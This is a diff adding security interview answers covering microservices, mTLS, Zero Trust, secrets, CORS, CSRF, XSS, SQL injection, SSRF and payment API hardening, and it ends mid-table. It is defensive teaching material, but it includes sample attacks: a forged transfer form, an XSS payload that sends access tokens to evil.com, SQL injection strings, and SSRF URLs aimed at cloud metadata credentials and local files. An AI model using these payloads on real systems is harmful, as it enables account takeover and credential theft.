@@ -725,3 +725,550 @@ app.MapPost("/payments/{id}/refunds", async (string id, IAuthorizationService au
 **When to externalise:** for a large estate with many services, move policy into **OPA/Cedar/OpenFGA** so rules are centrally managed, versioned, testable and auditable, with the application calling a decision point. The trade-off is a dependency in the request path (mitigate with a sidecar and local evaluation) versus consistency and auditability across dozens of services — which in a regulated environment usually wins.
 
 ---
+
+## Q21. How do you secure microservices?
+
+Layered, because a microservices estate multiplies every attack surface: more network paths, more credentials, more deployment pipelines, more places to get it wrong.
+
+**1. Identity for every workload.** Every service has its **own** identity — an IAM role (IRSA/Pod Identity on EKS, a task role on ECS), a SPIFFE identity in a mesh, or its own OAuth client. **Never a shared credential across services**: it destroys attribution, makes least privilege impossible, and turns one compromise into all of them.
+
+**2. Authenticate at the edge, authorise in the service.**
+- **Gateway**: validate the token (signature, issuer, audience, expiry), enforce coarse scopes, terminate TLS, rate limit. Reject the obviously-invalid before it reaches anything.
+- **Service**: enforce **resource-level** authorization — the gateway cannot know whether this user may refund *this* payment (Q1, Module 4 Q15).
+- **Never trust the network.** A request arriving on the internal network is not authenticated by virtue of its origin (Q23).
+
+**3. Encrypt everything in transit, including east-west.** TLS 1.2+ externally, **mTLS between services** (Q22) via a service mesh or ALB/NLB with client certificates. In a bank this is usually mandated, and a mesh is how you get it without touching application code.
+
+**4. Propagate user identity correctly.** Use **token exchange / On-Behalf-Of** so the downstream service sees who the user is and the audit trail names a person, not a service (Q16). Never let a downstream service simply trust a `X-User-Id` header from an upstream one — unless the boundary is genuinely closed and the header is stripped at ingress.
+
+**5. Secrets, not in code.** IRSA/Pod Identity where no secret is needed at all; Secrets Manager + the Secrets Store CSI driver where one is (Q25, Module 10 Q12).
+
+**6. Network segmentation as defence in depth.** Private subnets, security groups referencing security groups, **default-deny NetworkPolicies**, egress filtering. It will not stop a stolen token, but it bounds lateral movement.
+
+**7. Secure the supply chain.** Signed images, SBOMs, CVE scanning in CI **and** continuously in the registry, admission control that refuses unsigned images, pinned dependencies (Module 10 Q28). A microservices estate has dozens of images; an unowned base image is a fleet-wide exposure.
+
+**8. Input validation and output encoding at every service.** Each service validates its own inputs; do not assume the caller did. This is the principle that makes a compromised neighbour survivable.
+
+**9. Observability that supports investigation.** Structured logs with a **correlation ID**, centralised and immutable; audit logs of every authorization decision on sensitive operations; distributed tracing; **and no secrets or tokens in any of it**.
+
+**10. Resilience as a security property.** Rate limiting, quotas, circuit breakers, bulkheads and timeouts — because availability is part of the security triad and an unbounded retry storm is a self-inflicted denial of service (Module 11 Q27–Q28).
+
+**11. Governance.** SCPs and admission policies that *prevent* rather than detect; IaC reviewed in pull requests; **no standing human write access to production**; separation of duties between author and approver; and periodic access review with IAM Access Analyzer's unused-access findings (Module 9 Q23).
+
+**The framing to close on:** in a monolith there is one perimeter; in microservices there are dozens, so **the perimeter stops being the control**. Identity becomes the control plane — every call authenticated, every call authorised, every call attributable — and the network becomes a secondary containment layer rather than the primary defence.
+
+---
+
+## Q22. What is mTLS?
+
+**Mutual TLS** extends standard TLS so that **both** parties present and validate X.509 certificates. In ordinary TLS only the server proves its identity; in mTLS the client does too.
+
+```
+Standard TLS                              Mutual TLS
+  Client ──── ClientHello ──────▶ Server    Client ──── ClientHello ─────▶ Server
+  Client ◀─── cert + ServerHello ─ Server   Client ◀─── cert + CertRequest ─ Server
+  Client verifies the server's cert         Client ──── ITS OWN cert ─────▶ Server
+  Client is UNAUTHENTICATED at TLS level    Server verifies the client's cert
+                                            ✅ BOTH sides are authenticated
+```
+
+**What it gives you:**
+
+| Property | Detail |
+|---|---|
+| **Mutual authentication** | Cryptographic proof of *both* identities, at the transport layer, before a single byte of application data |
+| **Encryption** | Standard TLS confidentiality and integrity |
+| **Identity independent of the application** | The identity is the certificate, so it cannot be spoofed by a header |
+| **Sender-constrained tokens** | An access token can be **bound to the client certificate** (RFC 8705), so a stolen token is useless without the private key (Q9) — this is what **FAPI** requires |
+
+**Where it is used, and why:**
+- **Service-to-service inside a platform** — the primary use, and the main reason organisations adopt a **service mesh**: Istio/Linkerd issue a short-lived certificate per workload (SPIFFE identity), rotate it automatically, and enforce mTLS with **zero application code**. Doing this by hand across fifty services is a certificate-management project nobody finishes.
+- **Partner and B2B integrations** — extremely common in banking and payments: the counterparty's certificate *is* their identity, often pinned to a specific issuer.
+- **Open Banking / PSD2 / FAPI** — mTLS with eIDAS (QWAC/QSEAL) certificates is mandated.
+- **Zero Trust** — mTLS is the concrete mechanism that makes "never trust the network" implementable (Q23).
+
+**The hard part is certificate lifecycle, not the protocol.** Issuance, distribution, rotation, revocation (CRL/OCSP), and trust-store management across a fleet. **Certificate expiry is one of the most common causes of a total outage** — everything works, then at 03:14 on a Tuesday nothing does. Mitigations: automated issuance and rotation (mesh, cert-manager, AWS Private CA), **short-lived certificates** (hours, so rotation is exercised constantly rather than annually), and an alert 30 days before any long-lived certificate expires.
+
+**mTLS vs a JWT — they are complementary, not alternatives:** mTLS authenticates the **workload/channel**; a JWT carries the **user context and authorization claims**. In a mature platform you have both: mTLS proving *which service* is calling, and a token proving *on whose behalf*.
+
+---
+
+## Q23. What is Zero Trust?
+
+**Zero Trust is a security model that assumes no implicit trust based on network location.** The formulation, per **NIST SP 800-207**, is that trust is never granted implicitly and must be continually evaluated — every request is authenticated, authorised and encrypted, regardless of whether it originates inside or outside the traditional perimeter.
+
+**The shift it represents:**
+
+| **Perimeter model ("castle and moat")** | **Zero Trust** |
+|---|---|
+| Inside the network = trusted | **Nothing is trusted by location** |
+| Authenticate once at the edge | **Authenticate and authorise every request** |
+| Flat internal network | **Micro-segmentation**; least-privilege network paths |
+| Breach = full lateral movement | Breach is **contained** to what that identity can reach |
+| VPN as the control | **Identity as the control plane** |
+
+**Why the perimeter model failed:** cloud, SaaS and remote work dissolved the perimeter; and empirically, most serious breaches involve an attacker who is already inside — via phishing, a compromised supplier, a stolen credential, or a vulnerable public-facing service — after which a flat internal network gives them everything.
+
+**The core principles, and the concrete mechanism for each:**
+
+| Principle | Mechanism |
+|---|---|
+| **Verify explicitly** | Authenticate every request — user, device, workload. mTLS + tokens, no anonymous internal calls |
+| **Least privilege** | Fine-grained, just-in-time, time-bound access; no standing production write access |
+| **Assume breach** | Micro-segmentation, blast-radius limits, encryption everywhere, comprehensive logging |
+| **Continuous evaluation** | Re-evaluate on signals — risk score, device posture, impossible travel, anomalous behaviour |
+| **Encrypt everywhere** | TLS/mTLS in transit, KMS at rest, including internal traffic |
+
+**What it looks like concretely on AWS/Kubernetes** — and this is where the answer must land, because Zero Trust is otherwise a slogan:
+- **Users**: IdP with MFA (phishing-resistant, ideally FIDO2), conditional access on device posture, short-lived sessions, JIT elevation.
+- **Workloads**: IAM roles per pod (IRSA/Pod Identity), **IMDS blocked from containers**, no shared credentials.
+- **Network**: private subnets, SG-to-SG rules, **default-deny NetworkPolicies**, PrivateLink instead of internet paths, egress filtering.
+- **Service-to-service**: **mTLS with per-workload SPIFFE identity**, plus L7 authorization policy ("service A may call `POST /payments` on B, and nothing else").
+- **Data**: encrypted with keys you control, access via IAM with `aws:PrincipalOrgID` and `aws:SourceVpce` conditions.
+- **Detection**: CloudTrail, GuardDuty, audit logs, anomaly alerting.
+
+**The honest caveat to voice:** Zero Trust is a **direction of travel, not a product**, and vendors sell it as the latter. You implement it incrementally — strong identity first, then segmentation, then continuous evaluation — and the biggest practical wins come early: eliminating shared credentials, per-workload identity, and default-deny networking.
+
+---
+
+## Q24. How do you secure service-to-service communication?
+
+Four layers, and a mature platform has all of them.
+
+**1. Transport — encrypt and mutually authenticate.**
+**mTLS** (Q22), ideally via a service mesh so certificates are issued and rotated automatically per workload with no application code. If a mesh is too much, ALB/NLB with client certificates, or application-level mTLS with `HttpClientHandler.ClientCertificates` in .NET. The requirement is that **a service can prove which service is calling it**, not merely that the traffic is encrypted.
+
+**2. Identity and authorization — what may this caller do?**
+
+| Approach | Notes |
+|---|---|
+| **Mesh L7 policy** (Istio `AuthorizationPolicy`) | *"`payments` may call `POST /entries` on `ledger`; nothing else may call it at all."* Enforced in the proxy, no code |
+| **Client credentials token** (Q15) | The caller presents a token with scopes; the callee validates issuer, audience and scope |
+| **AWS SigV4 / IAM** | For AWS-native paths (API Gateway with IAM auth, PrivateLink + resource policies) — no secret at all |
+| **Network policy** | Coarse L3/L4 backstop: only the payments namespace can reach the ledger's port |
+
+**3. User context — who is this *for*?** Machine identity alone is not enough for an audit trail. Use **token exchange (RFC 8693)** or **On-Behalf-Of** so the downstream token names the user, with an `act` (actor) claim showing which service is acting for them (Q16). A `X-User-Id` header trusted without verification is a privilege-escalation bug waiting to happen — anyone who can reach the service can claim to be anyone.
+
+**4. Message-level security for asynchronous paths.** Transport security does nothing for a message sitting in a queue. For high-value events: **encrypt sensitive fields** (envelope encryption with KMS), **sign the payload** so a consumer can verify the producer, and keep PII out of the message entirely by passing a reference (the **Claim Check** pattern) that the consumer resolves with its own authorization.
+
+**Practical hardening that gets missed:**
+- **Validate at every service.** Do not assume an upstream sanitised the input.
+- **Timeouts, retries with jitter, circuit breakers** — availability is a security property.
+- **Strip client-supplied trust headers at ingress** (`X-User-Id`, `X-Forwarded-*` when not from a trusted proxy) so an external caller cannot inject internal trust signals.
+- **Rate limit internally too.** A compromised or buggy internal service can DoS a critical one just as effectively as an external attacker.
+- **Log the calling identity on every request** — this is what makes an incident investigable.
+
+**The layered answer in one line:** *mTLS proves which workload is calling, a token proves on whose behalf, a policy decides whether that combination may perform this operation, and the network limits who can even attempt it.*
+
+---
+
+## Q25. How do you manage secrets?
+
+**The best-managed secret is one that does not exist** — start there, because it reframes the whole question.
+
+**1. Eliminate secrets wherever possible.**
+
+| Instead of | Use |
+|---|---|
+| AWS access keys in config | **IAM roles** — IRSA/Pod Identity on EKS, task roles on ECS, instance profiles on EC2 |
+| A stored client secret for CI → AWS | **OIDC federation** (GitHub Actions → IAM role) — no stored credential |
+| A database password | **IAM database authentication** (RDS), or a token generated per connection |
+| A partner API key | **mTLS** with a client certificate, or `private_key_jwt` (Q15) |
+
+Every one of these removes a secret from the estate entirely, which is strictly better than storing it well.
+
+**2. For what remains, use a managed secret store.**
+**AWS Secrets Manager** (rotation built in, cross-account, KMS-encrypted) for credentials that must rotate; **SSM Parameter Store SecureString** for secrets that don't (free, and a legitimate choice — Module 9 Q26); **HashiCorp Vault** where one secrets plane must span cloud and data centre, and where **dynamic, short-lived credentials** are wanted.
+
+**3. Deliver them safely at runtime.**
+- **Secrets Store CSI driver** — mounts the secret as a `tmpfs` file at pod start; **the value never enters etcd**. The strongest option on Kubernetes.
+- **ECS `secrets` block / Lambda environment from Secrets Manager** — injected at start, not stored in the task definition.
+- **Prefer file mounts over environment variables** — env vars leak into crash dumps, `/proc`, child processes, and anything that prints the environment.
+- **Cache in memory** with a refresh interval; never call `GetSecretValue` per request (throttled, billed, and adds latency).
+
+**4. Rotate, and make rotation a non-event.** Secrets Manager's **two-user rotation strategy** for databases means there is never a window where the stored credential is invalid — no downtime, no rotation-day incident. In the application, catch an authentication failure, force a cache refresh, retry once; that single retry is what makes rotation invisible.
+
+**5. Keep them out of everywhere they don't belong.** Not in Git (enforce with gitleaks/`git-secrets` pre-commit **and** in CI), not in container images, not in Terraform state committed to a repo, not in logs (redact at the logging middleware), not in error responses, not in APM traces, not in a ticket.
+
+**6. Least privilege and detection.** IAM policies scoped to specific secret ARNs per workload; **KMS key policies as a second gate**, so decrypt requires both the IAM permission and the key policy; CloudTrail on every `GetSecretValue` and every `Decrypt`; alert on unusual access volume or access from an unexpected principal.
+
+**7. Assume compromise and plan for it.** A documented rotation runbook per secret type, with a measured time-to-rotate. "How long would it take us to rotate every credential?" is a question you want answered before an incident, not during one.
+
+---
+
+## Q26. What is CORS?
+
+**Cross-Origin Resource Sharing** is a **browser** security mechanism that relaxes the **same-origin policy**, allowing a page from one origin to make requests to another origin — but only when the target server explicitly permits it via response headers.
+
+**The same-origin policy** blocks a page at `https://app.example.com` from reading responses from `https://api.other.com`. An **origin** is scheme + host + port; any difference makes it cross-origin.
+
+**How it works — the preflight is the part to know:**
+
+```
+For "non-simple" requests (custom headers, methods beyond GET/POST/HEAD,
+JSON content type), the browser first sends:
+
+  OPTIONS /payments HTTP/1.1
+  Origin: https://app.example.com
+  Access-Control-Request-Method: POST
+  Access-Control-Request-Headers: authorization, content-type
+
+Server responds:
+  Access-Control-Allow-Origin: https://app.example.com
+  Access-Control-Allow-Methods: POST, GET
+  Access-Control-Allow-Headers: authorization, content-type
+  Access-Control-Allow-Credentials: true
+  Access-Control-Max-Age: 600          ← cache the preflight; otherwise every request doubles
+
+Only then does the browser send the actual POST.
+```
+
+**The three misconceptions that matter, and an interviewer will probe at least one:**
+
+1. **CORS is not a server-side security control.** It is enforced **by the browser**, for the browser's protection. `curl`, Postman, a server-side HTTP client and any non-browser attacker ignore it entirely. **A permissive CORS policy does not create a vulnerability in your API; it removes a protection for your users' browsers.** Your API must still authenticate and authorise every request.
+2. **`Access-Control-Allow-Origin: *` cannot be combined with credentials.** With `Allow-Credentials: true`, the origin must be an explicit value, not a wildcard. Browsers enforce this, and the workaround people reach for — reflecting the `Origin` header back — is the dangerous part: it effectively allows *every* origin with credentials, so any site can make authenticated requests as your logged-in user and read the responses.
+3. **CORS is not CSRF protection** (Q27). CORS governs *reading* cross-origin responses; a CSRF attack often does not need to read the response, only to cause the side effect.
+
+**In ASP.NET Core:**
+```csharp
+builder.Services.AddCors(o => o.AddPolicy("app", p => p
+    .WithOrigins("https://app.example.com")     // explicit — never AllowAnyOrigin with credentials
+    .WithMethods("GET", "POST")
+    .WithHeaders("Authorization", "Content-Type")
+    .AllowCredentials()
+    .SetPreflightMaxAge(TimeSpan.FromMinutes(10))));
+
+app.UseCors("app");   // must come before UseAuthorization and endpoint mapping
+```
+**Never** `AllowAnyOrigin().AllowAnyHeader().AllowAnyMethod().AllowCredentials()` — ASP.NET Core will actually throw on that combination, which is the framework saving you from a real vulnerability.
+
+---
+
+## Q27. What is CSRF?
+
+**Cross-Site Request Forgery** (OWASP): an attack that forces an authenticated user's browser to send a state-changing request to an application **in which they are currently authenticated**, without their intent. The application cannot distinguish the forged request from a genuine one because the browser attaches the credentials automatically.
+
+**The attack, concretely:**
+
+```html
+<!-- The victim is logged into bank.example.com (a session cookie exists).
+     They visit evil.com, which contains: -->
+<form action="https://bank.example.com/transfer" method="POST" id="f">
+  <input type="hidden" name="to"     value="attacker-account">
+  <input type="hidden" name="amount" value="10000">
+</form>
+<script>document.getElementById('f').submit();</script>
+```
+The browser **automatically attaches the bank's session cookie** (that is what cookies do), so the transfer executes as the victim. The attacker never sees the response — and does not need to.
+
+**The precondition is ambient authority:** CSRF only works when credentials are attached **automatically** by the browser — session cookies, HTTP Basic auth, Windows/NTLM auth, client certificates. If the credential must be **explicitly added by JavaScript** (a bearer token in an `Authorization` header), the attacker's cross-site form cannot add it, and CSRF does not apply.
+
+**Defences, in order:**
+
+| Defence | How |
+|---|---|
+| **`SameSite` cookies** | `SameSite=Lax` (the modern browser default) blocks cookies on cross-site POSTs; `SameSite=Strict` for the most sensitive. **The single highest-value mitigation** |
+| **Anti-forgery / synchroniser token** | A per-session, unpredictable token in a hidden field or header, validated server-side. The attacker cannot read it (same-origin policy prevents it) |
+| **Double-submit cookie** | Token in both a cookie and a header; the server compares them. Useful when server-side state is undesirable |
+| **Verify `Origin`/`Referer`** | Reject state-changing requests whose `Origin` is not yours. A good defence in depth |
+| **Never use GET for state changes** | A `GET /transfer?amount=…` is exploitable with a bare `<img>` tag |
+| **Re-authenticate for high-value actions** | Step-up auth / transaction signing on a transfer — the control a bank actually relies on |
+
+**In ASP.NET Core:** anti-forgery is built in — `@Html.AntiForgeryToken()` in Razor with `[ValidateAntiForgeryToken]`, or `[AutoValidateAntiforgeryToken]` applied globally so it is opt-out rather than opt-in. Minimal APIs and Razor Pages have it enabled for form posts by default.
+
+**Q28's counterpart worth stating:** **XSS defeats every CSRF defence.** Script running on your origin can read the anti-forgery token and make same-origin requests. So CSRF protection is only meaningful on top of solid XSS prevention — which is why the two are always discussed together.
+
+---
+
+## Q28. What is XSS?
+
+**Cross-Site Scripting** (OWASP): an injection flaw in which an attacker gets **malicious script executed in another user's browser, in the context of your origin**. Because it runs as your site, it inherits your site's privileges: it can read cookies (unless HttpOnly), read `localStorage`, read the DOM, make authenticated same-origin requests, and modify what the user sees.
+
+**Three types:**
+
+| Type | Where the payload lives |
+|---|---|
+| **Stored (persistent)** | Saved on the server (a comment, a profile field, a merchant name) and served to every viewer. **The most damaging** |
+| **Reflected** | In the request (a query parameter echoed into the response); requires luring the victim to a crafted link |
+| **DOM-based** | Never reaches the server — client-side JavaScript writes untrusted data into a dangerous sink (`innerHTML`, `eval`, `document.write`) |
+
+```
+Attacker posts a merchant display name:
+  <img src=x onerror="fetch('https://evil.com/?c='+localStorage.getItem('access_token'))">
+Every operator who views the merchant list exfiltrates their token.
+```
+
+**Why it is the most serious client-side flaw:** it defeats CSRF tokens (Q27), it reads tokens from `localStorage`, it can perform any action the user can, and it is invisible to the victim.
+
+**Defences, in order of effectiveness:**
+
+1. **Context-aware output encoding — the primary defence.** Encode untrusted data for the context it lands in: HTML body, HTML attribute, JavaScript, URL, CSS. Each has different rules; HTML-encoding data that lands inside a `<script>` block does not protect you.
+2. **Use a framework that encodes by default.** Razor encodes automatically with `@value`; React escapes by default in JSX. **The vulnerabilities are in the escape hatches** — `@Html.Raw`, `dangerouslySetInnerHTML`, `[innerHTML]` in Angular, `v-html` in Vue. Treat every use of those as requiring review.
+3. **Content Security Policy.** A strong CSP (`script-src 'self' 'nonce-…'`, no `unsafe-inline`, no `unsafe-eval`) turns many XSS bugs from exploitable into inert. It is the most valuable defence-in-depth layer and is under-deployed.
+4. **Sanitise HTML you must render** — with a vetted library (**HtmlSanitizer** in .NET, DOMPurify in the browser), never a hand-rolled regex blocklist.
+5. **`HttpOnly`, `Secure`, `SameSite` cookies**, so script cannot read the session cookie. **And do not put access tokens in `localStorage`** — the BFF pattern with an HttpOnly cookie removes this entire exposure (Q6, Module 12 Q14).
+6. **Validate input** as a secondary control — allow-list where the format is known (an account number, a currency code). Input validation is not a substitute for output encoding, because the same data may be rendered in several contexts.
+
+**The principle worth stating:** *XSS is an **output** problem, not an input problem.* The same string is safe in a JSON response, dangerous in `innerHTML`, and differently dangerous inside a `<script>` block. **Encode at the point of output, for that specific context** — that is why frameworks that encode by default eliminate most of the risk.
+
+---
+
+## Q29. What is SQL Injection?
+
+**SQL Injection** (OWASP, and a member of the **Injection** category in the Top 10): an attacker supplies input that is interpreted as **SQL code** rather than data, because the application concatenates untrusted input into a query string.
+
+```csharp
+// ✗ VULNERABLE
+var sql = $"SELECT * FROM users WHERE email = '{email}' AND active = 1";
+// email = "' OR '1'='1' --"
+// → SELECT * FROM users WHERE email = '' OR '1'='1' --' AND active = 1
+//   Returns every user, including inactive and administrative accounts.
+```
+
+**What it enables:** authentication bypass, exfiltration of entire tables, data modification and deletion, and — depending on privileges — command execution on the database host (`xp_cmdshell`, `COPY … PROGRAM`). It remains one of the most damaging vulnerability classes because it reaches straight to the data.
+
+**Variants to name:** classic/in-band, **blind** (boolean or time-based — `WAITFOR DELAY '0:0:5'` — where you infer data one bit at a time with no visible output), out-of-band (DNS/HTTP exfiltration), and **second-order**, where the payload is stored safely and then unsafely concatenated by a *different* query later.
+
+**The defences, in order:**
+
+**1. Parameterised queries — the complete fix.** Parameters are sent to the database **separately from the SQL text**, so the value can never be parsed as code, no matter what it contains.
+```csharp
+// ✓ ADO.NET
+cmd.CommandText = "SELECT * FROM users WHERE email = @email AND active = 1";
+cmd.Parameters.Add("@email", SqlDbType.NVarChar, 256).Value = email;
+
+// ✓ Dapper
+await conn.QueryAsync<User>("SELECT * FROM users WHERE email = @email", new { email });
+
+// ✓ EF Core — LINQ always parameterises
+await ctx.Users.Where(u => u.Email == email).ToListAsync();
+
+// ✓ EF Core raw SQL with interpolation — FromSql PARAMETERISES the interpolated values
+await ctx.Users.FromSql($"SELECT * FROM users WHERE email = {email}").ToListAsync();
+
+// ✗ FromSqlRaw with string concatenation is NOT safe
+await ctx.Users.FromSqlRaw("SELECT * FROM users WHERE email = '" + email + "'").ToListAsync();
+```
+The `FromSql` vs `FromSqlRaw` distinction is a favourite interview detail: `FromSql` with an interpolated string is safe because EF Core converts the interpolation holes into parameters; `FromSqlRaw` with concatenation is not.
+
+**2. What parameters cannot protect** — and knowing this is what separates a real answer: **identifiers cannot be parameterised.** A dynamic table name, column name or `ORDER BY` direction must be validated against an **allow-list**:
+```csharp
+var allowed = new[] { "created_at", "amount", "status" };
+if (!allowed.Contains(sortColumn)) throw new ArgumentException();
+```
+
+**3. Defence in depth:** least-privilege database accounts (the application user should not own the schema, and should not be `db_owner`); **stored procedures** (only if they themselves parameterise — dynamic SQL inside a procedure is just as vulnerable); input validation as a secondary control; a WAF as a detection/slowing layer, never as the fix; generic error messages so failures do not leak schema; and monitoring/alerting on SQL errors, which spike during an attack.
+
+**The one-line rule:** *never build SQL by concatenating untrusted input — pass it as a parameter, or validate it against an allow-list if it must be an identifier.*
+
+---
+
+## Q30. What is SSRF?
+
+**Server-Side Request Forgery** (OWASP Top 10 A10): an attacker induces the **server** to make an HTTP (or other protocol) request to a destination of the attacker's choosing. The server becomes a proxy into networks the attacker cannot reach directly.
+
+```
+POST /import   { "url": "https://attacker-controlled/data.csv" }
+
+Attacker instead supplies:
+  http://169.254.169.254/latest/meta-data/iam/security-credentials/   ← AWS IMDS
+  http://localhost:8080/admin/                                        ← internal admin UI
+  http://10.0.3.14:5432/                                              ← internal database
+  file:///etc/passwd                                                  ← local file read
+  http://internal-service.svc.cluster.local/                          ← Kubernetes internal
+```
+
+**Why it is so damaging in the cloud:** the **instance metadata service** at `169.254.169.254` returns the instance's IAM credentials to anything that can make an HTTP request from the host. SSRF plus IMDSv1 is a direct path to the workload's AWS credentials — this is the mechanism behind the 2019 Capital One breach, which is worth citing because it makes the risk concrete rather than theoretical.
+
+**Defences, layered:**
+
+| Defence | Detail |
+|---|---|
+| **Allow-list destinations** | The **only robust application-level fix**. Permit specific hosts/URLs; reject everything else. A **deny-list is not sufficient** — DNS rebinding, redirects, decimal/octal/IPv6 IP encodings and `[::ffff:169.254.169.254]` all evade it |
+| **Resolve, then validate, then pin** | Resolve the hostname, check the resolved IP is not private/link-local/loopback, then connect **to that IP** — otherwise DNS rebinding changes the answer between check and use |
+| **Disable redirects**, or re-validate each hop | An allowed URL that 302s to `169.254.169.254` defeats a naive check |
+| **Restrict schemes** | HTTPS only; block `file://`, `gopher://`, `ftp://`, `dict://` |
+| **IMDSv2 with hop limit 1** | Requires a `PUT` to obtain a session token and blocks the request from a container. On EKS, **block IMDS from pods entirely** (Module 10 Q27). This is the single highest-value cloud mitigation |
+| **Network egress control** | The service can only reach the specific external hosts it needs — AWS Network Firewall, NetworkPolicy egress rules, or an outbound proxy with an allow-list |
+| **No secrets in metadata-reachable places**, and short-lived credentials everywhere |
+
+**Where the vulnerability hides:** URL-fetching features (webhook registration, "import from URL", PDF/HTML rendering, image thumbnailing, link previews, SSO metadata fetching, XML parsers with external entity resolution). Any feature where a user supplies a URL is an SSRF candidate — and webhooks in a payments platform are exactly such a feature (Module 16).
+
+**The architectural framing:** SSRF turns your service's **network position** into the attacker's. The defence is therefore both application-level (validate and allow-list) **and** network-level (the service should not be able to reach anything it does not need — which is Zero Trust egress control, Q23).
+
+---
+
+## Q31. What is rate limiting?
+
+**Rate limiting** restricts how many requests a client may make in a time window. Per the Azure Architecture Center's Rate Limiting pattern, it exists to *"avoid or minimize throttling errors by controlling the consumption of resources"*, and the related Throttling pattern to *"control the consumption of resources from applications, tenants, or services."*
+
+**It is simultaneously a security control and an availability control:**
+
+| Protects against | How |
+|---|---|
+| **Brute force** on login, OTP, card enumeration | Caps attempts per account/IP |
+| **Credential stuffing** | Slows automated attempts to a useless rate |
+| **Scraping and enumeration** | Bounds data extraction rate |
+| **Application-layer DoS** | Prevents one client saturating capacity |
+| **Cost abuse** | Bounds spend on metered downstreams (an LLM API, an SMS gateway, a KYC provider) |
+| **Noisy neighbour** | Fair sharing between tenants |
+| **Runaway clients** | A buggy client's retry loop cannot take you down |
+
+**Algorithms, and the trade-off between them:**
+
+| Algorithm | Behaviour |
+|---|---|
+| **Fixed window** | Simple; suffers a **boundary burst** — 2× the limit across a window edge |
+| **Sliding window** | Smooths the boundary problem; more state |
+| **Token bucket** | **Allows bursts** up to the bucket size, then a steady refill rate. Usually the best fit for APIs |
+| **Leaky bucket** | Enforces a strictly constant output rate; smooths bursts away |
+| **Concurrency limiter** | Caps **in-flight** requests rather than rate — often the better control for protecting a saturated resource (Module 11 Q28) |
+
+**In ASP.NET Core** (`AddRateLimiter`, built-in since .NET 7):
+```csharp
+builder.Services.AddRateLimiter(o =>
+{
+    o.AddTokenBucketLimiter("payments", opt =>
+    {
+        opt.TokenLimit = 100;                                  // burst allowance
+        opt.TokensPerPeriod = 50;                              // refill
+        opt.ReplenishmentPeriod = TimeSpan.FromSeconds(1);
+        opt.QueueLimit = 0;                                    // reject rather than queue
+    });
+    o.RejectionStatusCode = StatusCodes.Status429TooManyRequests;
+    o.OnRejected = async (ctx, ct) =>
+        ctx.HttpContext.Response.Headers.RetryAfter = "1";     // tell the client what to do
+});
+```
+
+**Design guidance that separates a good implementation:**
+- **Choose the key deliberately** — per API key/client, per user, per tenant, per IP, or a combination. **IP alone is weak**: NAT and mobile carriers put thousands of users behind one address, and attackers rotate through proxies.
+- **Different limits for different endpoints.** Login and OTP need much tighter limits than a product listing.
+- **Return `429` with `Retry-After`** and the standard `RateLimit-*` headers, so well-behaved clients back off correctly rather than hammering harder.
+- **Distributed state.** Per-instance limiting means the effective limit is `instances × limit`. Use Redis (or the gateway's own limiter) for a fleet-wide limit.
+- **Layer it**: WAF rate-based rules and API Gateway throttling at the edge (cheapest place to reject), plus application-level limits for business rules a gateway cannot express.
+- **Fail open or closed, deliberately.** If Redis is down, do you reject everything or allow everything? For a login endpoint, fail **closed**; for a product catalogue, fail **open**. Decide in advance.
+
+---
+
+## Q32. How do you secure a fintech payment API?
+
+Every layer, with the regulatory requirement named at each — this is where a fintech panel expects specifics rather than generalities.
+
+**1. Transport and edge.** TLS 1.2+ (1.3 preferred) with strong ciphers and HSTS; **mTLS for partner and merchant integrations**, with certificates pinned to an approved issuer (mandatory under PSD2/FAPI); CloudFront + **WAF** (managed rule sets, plus rate-based rules scoped to `/payments` and `/auth`); **Shield** for DDoS; and an API Gateway performing token validation, throttling and per-partner quotas.
+
+**2. Authentication.** OAuth 2.0 **authorization code + PKCE** for user-facing clients; **client credentials with `private_key_jwt` or mTLS** for partners — never a shared secret in a plain header. **Sender-constrained (certificate-bound) access tokens** per RFC 8705, which is the FAPI requirement. Short access-token lifetimes (5–15 min) and rotated refresh tokens with reuse detection. **MFA — phishing-resistant where possible — for every human**, and step-up authentication for high-value operations.
+
+**3. Authorization.** Scope + role + attribute + **object-level** checks on every request (Q17–Q20). Explicitly: **tenant isolation on every query** (a merchant must never be able to read another merchant's payment — BOLA is the number-one API risk), **approval limits** as claims, and **segregation of duties / four-eyes** on refunds, adjustments and configuration changes. No standing production write access for humans; JIT elevation with an approval trail.
+
+**4. Request integrity.** **Idempotency keys mandatory** on every state-changing endpoint (Module 14 Q14) — a retry must never become a second charge. **Request signing** (HMAC or detached JWS over method, path, body hash, timestamp and nonce) for partner integrations, with a short timestamp window and nonce cache to prevent **replay**. Strict schema validation and hard limits on request size and array lengths.
+
+**5. Data protection.** **Tokenise the PAN** so card data never enters your stores — this is the single biggest reducer of **PCI-DSS scope**. Field-level encryption for remaining PII with KMS CMKs; TLS everywhere internally; **no PAN, CVV, full track data, or credentials in logs, ever** — enforce with redaction middleware and test it. Data residency enforced by Region choice and SCPs.
+
+**6. Fraud and abuse controls.** Velocity checks (per card, per device, per IP, per merchant), anomaly detection, device fingerprinting, **3-D Secure / SCA** where regulation requires it, and a decision log that records **why** a transaction was declined — because the customer and the regulator will both ask.
+
+**7. Reliability as a security property.** Rate limits and quotas per partner; circuit breakers and bulkheads so one provider's outage does not cascade; graceful degradation; and **queue-and-confirm rather than fail** for ambiguous outcomes (Module 12 Q18).
+
+**8. Auditability.** An **immutable audit log** of every payment operation, every authorization decision, every configuration change and every administrative action — write-once (S3 Object Lock), retained per the applicable regime (often 5–7 years), with correlation IDs linking the whole chain. **Event sourcing makes this inherent rather than bolted on** (Module 13 Q23).
+
+**9. Compliance and process.** PCI-DSS scope minimisation and segmentation; SOX change control (IaC + pull request + separation of duties); SCA/PSD2 where applicable; annual penetration testing and continuous scanning; a documented and **tested** incident-response plan; vendor/third-party risk assessment; and **DORA-style tested resilience** with evidence.
+
+**10. Reconciliation — the control that catches what the code cannot.** Nightly reconciliation against the provider's settlement file, with breaks classified and worked. No amount of application-level correctness substitutes for it (Module 14 Q18).
+
+---
+
+## Q33. How do you implement defence in depth?
+
+**Defence in depth is the principle that no single control should be load-bearing** — you assume every layer will eventually fail, and design so that a failure at one layer is caught by another.
+
+**Per the AWS Well-Architected Security pillar**, this is the "apply security at all layers" design principle: apply defence in depth with multiple controls at the edge, the VPC, the load balancer, the instance, the operating system, the application and the code.
+
+**The layers, and what each catches:**
+
+| Layer | Controls | What it catches when the layer above fails |
+|---|---|---|
+| **Governance** | SCPs, Config rules, admission policy, IaC review, separation of duties | A misconfiguration before it exists |
+| **Edge** | CloudFront, WAF, Shield, rate limiting, geo-restriction | Volumetric attacks, known-bad payloads, brute force |
+| **Network** | Private subnets, SG-to-SG rules, NACLs, NetworkPolicy, Network Firewall egress control, PrivateLink | Lateral movement, exfiltration paths |
